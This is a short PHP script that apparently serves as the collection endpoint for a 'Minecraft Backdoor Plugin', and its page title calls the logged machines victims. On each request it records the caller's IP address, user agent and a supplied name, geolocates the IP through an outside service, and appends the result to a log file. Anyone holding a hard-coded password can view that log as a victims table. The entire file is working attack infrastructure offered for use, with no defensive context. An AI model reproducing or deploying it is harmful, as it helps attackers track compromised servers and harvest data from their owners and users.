<? 
if (!file_exists("victims.txt")) {file_put_contents("victims.txt", "<font color=white><h1>Minecraft Backdoor Plugin API - Victims</h1>");
}

$file = 'victims.txt'; 

if (isset($_GET['pass']) && $_GET['pass'] == "mbpapi") {

while (!is_readable($file)) {
}

die("<style>table, th, td {
   border: 1px solid #8C1D1D;
   background-color:#A61D1D;
}</style><body bgcolor=black><table><tr><th><font color=white>FLAG</th><th><font color=white>LOCATION</th><th><font color=white>IP-ADDRESS</th><th><font color=white>HTTP_USER_AGENT</th><th><font color=white>NAME</th></tr>" . file_get_contents($file) . "</table>");
} 

$ipAddress = $_SERVER['REMOTE_ADDR'];
if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
    $ipAddress = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));
} 

  function get_content($URL){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $URL);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
  } 

$countryCode = get_content('http://api.wipmania.com/' . $ipAddress);$data = "<tr><font color=white><td><font color=white><img src=http://www.geonames.org/flags/x/" . strtolower($countryCode) . ".gif width='100'></td><td><font color=white>" . $countryCode . "</td><td><font color=white>" . htmlspecialchars($ipAddress) . "</td><td><font color=white>" . htmlspecialchars($_SERVER['HTTP_USER_AGENT']) . "</td><td><font color=white>" . (isset($_GET['name']) ? htmlspecialchars($_GET['name']) :"") . "</td><tr>";

while (!is_writable($file)) {
 //Wait for file permissions 
}

file_put_contents($file, $data, FILE_APPEND);?>
